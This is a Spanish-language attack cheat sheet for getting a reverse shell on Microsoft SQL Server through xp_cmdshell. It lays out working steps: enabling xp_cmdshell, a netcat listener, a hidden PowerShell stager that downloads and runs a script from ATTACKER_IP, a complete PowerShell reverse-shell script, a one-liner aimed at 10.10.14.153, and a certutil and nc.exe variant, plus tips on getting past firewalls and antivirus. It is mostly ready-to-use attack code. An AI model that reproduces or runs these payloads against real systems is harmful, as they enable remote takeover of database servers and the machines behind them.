## Reverse shell vía xp_cmdshell (MSSQL)

### 0) (si hace falta) Habilitar xp_cmdshell
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### 1) Prepara tu listener (atacante)
```bash
nc -lvnp 4444
```

### 2) Método A — PowerShell “stager” (descarga y ejecuta payload)
- Sirve un archivo con tu payload (ej: rev.ps1) usando un servidor web simple en tu máquina atacante.
- Desde MSSQL con xp_cmdshell ejecutas un comando PowerShell que descargue y ejecute ese archivo.
```sql
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/rev.ps1''))"';

```
Ejemplo rev.ps1:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$stream.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $s=(iex $d 2>&1 | Out-String)+"PS "+(pwd).Path+"> ";
  $stream.Write(([Text.Encoding]::ASCII).GetBytes($s),0,$s.Length);$stream.Flush()
}

```
### 3) Método B — PowerShell “one-liner” (sin archivos)
- Usa un único comando PowerShell que establezca conexión directa a tu listener.
- Ideal si no quieres subir archivos al sistema víctima.

```powershell
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient(''ATTACKER_IP'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$o=$o+''PS ''+(pwd).Path+''> ''; $s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()}"';

```

Ejemplo que funciona:
```powershell
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Command "$c=New-Object Net.Sockets.TCPClient(''10.10.14.153'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$o=$o+''PS ''+(pwd).Path+''> ''; $s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()}"';

```

### 4) Método C — certutil + nc.exe
- Descarga `nc.exe` en la máquina víctima con `certutil`.
- Ejecuta nc.exe con parámetros para conectarse a tu listener y lanzar cmd.exe.
```powershell
./nc.exe <ip> <port> -e cmd
```

## Notas rápidas
- Cambia la IP del atacante y el puerto según tu entorno.
- Si hay restricciones, prueba otras utilidades de Windows como `bitsadmin`, `Invoke-WebRequest` o `curl.exe`.
- Verifica la conectividad de salida (firewall) y posibles bloqueos por antivirus/EDR.
- Ejecuta `whoami` con xp_cmdshell para confirmar con qué usuario estás corriendo (lo ideal es `NT AUTHORITY\SYSTEM`).
